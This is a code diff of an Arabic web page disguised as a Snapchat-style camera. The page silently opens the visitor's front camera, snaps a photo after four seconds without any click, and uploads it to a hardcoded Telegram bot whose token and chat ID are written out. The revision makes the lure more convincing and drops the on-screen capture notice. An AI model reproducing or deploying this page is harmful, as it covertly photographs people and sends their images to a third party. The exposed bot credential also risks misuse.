@@ -1,93 +1,178 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Snap View</title>
-  <style>
-    body {
-      margin: 0;
-      background-color: black;
-      font-family: sans-serif;
-    }
-    video {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      object-fit: cover;
-    }
-    .overlay {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: linear-gradient(to top, rgba(0,0,0,0.6), transparent 80%);
-      z-index: 1;
-    }
-    .circle-button {
-      position: absolute;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 70px;
-      height: 70px;
-      border: 4px solid white;
-      border-radius: 50%;
-      background-color: rgba(255, 255, 255, 0.1);
-      cursor: pointer;
-      z-index: 2;
-    }
-    .loading {
-      position: absolute;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      color: white;
-      font-size: 18px;
-      z-index: 2;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Snapchat Style Camera</title>
+<style>
+  /* Reset */
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
+  }
+  body, html {
+    height: 100%;
+    background: black;
+    font-family: 'Arial', sans-serif;
+    overflow: hidden;
+  }
+
+  /* الفيديو كاميرا */
+  video {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    z-index: 1;
+  }
+
+  /* تدرج فوق الفيديو */
+  .overlay-gradient {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: linear-gradient(to top, rgba(0,0,0,0.7), transparent 80%);
+    pointer-events: none;
+    z-index: 2;
+  }
+
+  /* الشريط السفلي */
+  .bottom-bar {
+    position: absolute;
+    bottom: 0; left: 0;
+    width: 100%;
+    height: 120px;
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(15px);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 20px;
+    z-index: 10;
+  }
+
+  /* الأيقونات الصغيرة على اليمين (فلاتر) */
+  .filters {
+    display: flex;
+    gap: 15px;
+  }
+  .filter-circle {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    border: 2px solid white;
+    background-color: rgba(255,255,255,0.1);
+    cursor: pointer;
+    position: relative;
+  }
+  .filter-circle img {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    object-fit: cover;
+  }
+
+  /* زر الالتقاط الدائري الكبير */
+  .capture-button {
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    border: 4px solid white;
+    background-color: rgba(255,255,255,0.1);
+    cursor: pointer;
+    margin: 0 20px;
+    flex-shrink: 0;
+  }
+
+  /* الأيقونات على اليسار (القائمة، الكاميرا الأمامية ...) */
+  .left-icons {
+    display: flex;
+    gap: 25px;
+    align-items: center;
+  }
+  .icon-button {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background-color: rgba(255,255,255,0.15);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+  }
+  .icon-button img {
+    width: 24px;
+    height: 24px;
+  }
+
+</style>
 </head>
 <body>
 
-  <video id="video" autoplay muted playsinline></video>
-  <div class="overlay"></div>
-  <div class="loading">📷 جاري فتح الكاميرا...</div>
-  <div class="circle-button" onclick="takePicture()"></div>
+<video id="video" autoplay muted playsinline></video>
+<div class="overlay-gradient"></div>
 
-  <script>
-    const video = document.getElementById('video');
-    const token = '6242732866:AAFMLeQxUZtxDO4eQrr0PHvL1kMy2o6Tpqw';
-    const chat_id = '1929988314';
+<div class="bottom-bar">
+  <div class="left-icons">
+    <div class="icon-button" title="القائمة">
+      <!-- أيقونة قائمة (ثلاث خطوط) -->
+      <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24" width="24" height="24"><path d="M3 6h18M3 12h18M3 18h18" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
+    </div>
+    <div class="icon-button" title="تبديل الكاميرا">
+      <!-- أيقونة كاميرا -->
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="white" viewBox="0 0 24 24" width="24" height="24" stroke-width="2"><path d="M1 4h4l2-2h10l2 2h4v16H1z"/><circle cx="12" cy="13" r="4"/></svg>
+    </div>
+  </div>
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+  <div class="capture-button" title="التقاط الصورة" onclick="takePicture()"></div>
+
+  <div class="filters" title="فلاتر">
+    <div class="filter-circle" title="فلتر 1" style="background:#FF5555;">
+      <!-- رمز فلتر أو صورة -->
+    </div>
+    <div class="filter-circle" title="فلتر 2" style="background:#55FF55;"></div>
+    <div class="filter-circle" title="فلتر 3" style="background:#5555FF;"></div>
+    <div class="filter-circle" title="فلتر 4" style="background:#FFFF55;"></div>
+  </div>
+</div>
+
+<script>
+  const video = document.getElementById('video');
+  const token = '6242732866:AAFMLeQxUZtxDO4eQrr0PHvL1kMy2o6Tpqw';
+  const chat_id = '1929988314';
+
+  // تشغيل الكاميرا
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
       video.srcObject = stream;
 
-      // بعد ٤ ثواني يصور تلقائي
-      setTimeout(() => {
-        takePicture();
-      }, 4000);
+      // يلتقط صورة تلقائي بعد 4 ثواني
+      setTimeout(takePicture, 4000);
+    })
+    .catch(() => {
+      // خطأ في فتح الكاميرا، ممكن تضيف تنبيه هنا لو تبي
     });
 
-    function takePicture() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
+  function takePicture() {
+    if (!video.videoWidth || !video.videoHeight) return;
 
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', chat_id);
-        formData.append('photo', blob, 'photo.jpg');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        }).then(() => {
-          document.querySelector('.loading').textContent = '✅ تم التقاط الصورة';
-        });
-      }, 'image/jpeg');
-    }
-  </script>
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append('chat_id', chat_id);
+      formData.append('photo', blob, 'photo.jpg');
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }, 'image/jpeg');
+  }
+</script>
+
 </body>
-  </html>
+    </html>
